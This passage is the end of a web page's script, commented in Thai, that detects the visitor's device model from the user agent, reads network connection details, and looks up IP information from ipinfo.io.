                const versionStr = matches ? matches[1].replace(/_/g, '.') : "";
                deviceInfo.deviceModel = `iPhone (iOS ${versionStr})`;
            } else if (/iPad/.test(ua)) {
                const matches = ua.match(/iPad(?:\s+OS)?\s+([0-9_]+)/);
                const versionStr = matches ? matches[1].replace(/_/g, '.') : "";
                deviceInfo.deviceModel = `iPad (iOS ${versionStr})`;
            } else if (/Android/.test(ua)) {
                // ดึงข้อมูล Android model
                if (/samsung|SM-|Galaxy/i.test(ua)) {
                    const model = ua.match(/SM-[A-Z0-9]+/i) || ua.match(/Galaxy\s[A-Z0-9\s]+/i);
                    deviceInfo.deviceModel = model ? `Samsung ${model[0]}` : "Samsung Android";
                } else if (/Pixel|Google/i.test(ua)) {
                    const model = ua.match(/Pixel\s[0-9]+/i);
                    deviceInfo.deviceModel = model ? `Google ${model[0]}` : "Google Pixel";
                } else {
                    const genericModel = ua.match(/Android.*?;\s([^;)]+)(?:\s+Build|\))/i);
                    deviceInfo.deviceModel = genericModel ? genericModel[1].trim() : "Android Device";
                }
            }
            
            return deviceInfo;
        }

        // ฟังก์ชันดึงข้อมูลการเชื่อมต่อ
        function getConnectionInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            
            if (!connection) {
                return {
                    type: "unknown",
                    effectiveType: "unknown",
                    downlink: null,
                    rtt: null
                };
            }
            
            return {
                type: connection.type || "unknown",
                effectiveType: connection.effectiveType || "unknown",
                downlink: connection.downlink || null,
                rtt: connection.rtt || null,
                saveData: connection.saveData || false
            };
        }

        // ฟังก์ชันดึงข้อมูล IP ผ่าน API (ทำงานแบบ best-effort)
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipinfo.io/json', { timeout: 2000 });
                if (!response.ok) {
                    throw new Error(`Failed to fetch IP info: ${response.status}`);
                }
                return await response.json();
            } catch (error) {
                console.warn("Could not fetch IP info:", error);
                return null; // ล้มเหลวแต่ไม่ทำให้โปรแกรมหยุดทำงาน
            }
        }
    </script>
</body>
</html>
